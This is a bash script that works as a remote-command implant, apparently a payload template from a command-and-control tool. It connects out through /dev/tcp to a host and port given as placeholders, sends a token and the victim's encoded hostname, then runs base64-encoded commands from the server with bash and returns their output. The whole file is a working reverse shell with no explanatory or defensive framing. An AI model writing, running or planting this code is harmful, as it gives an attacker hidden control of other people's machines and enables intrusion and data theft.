#!/usr/bin/env bash
set -u
HOST="${PL_HOST:-__IP__}"
PORT="${PL_PORT:-__PORT__}"
TOKEN="${PL_TOKEN:-__TOKEN__}"
CMD_TIMEOUT="${PL_CMD_TIMEOUT:-60}"
exec 3<>"/dev/tcp/${HOST}/${PORT}" || exit 1
host_b64=$(hostname 2>/dev/null | base64 | tr -d '\n')
printf 'HELLO %s linux %s\n' "$TOKEN" "$host_b64" >&3
while IFS=' ' read -r id cmd_b64 <&3; do
    [ -z "${id:-}" ] && continue
    cmd=$(printf '%s' "$cmd_b64" | base64 -d 2>/dev/null)
    if command -v timeout >/dev/null 2>&1; then
        out=$(timeout "$CMD_TIMEOUT" bash -c "$cmd" 2>&1)
        rc=$?
    else
        out=$(bash -c "$cmd" 2>&1)
        rc=$?
    fi
    out_b64=$(printf '%s' "$out" | base64 | tr -d '\n')
    printf '%s %s %s\n' "$id" "$rc" "$out_b64" >&3 || break
done
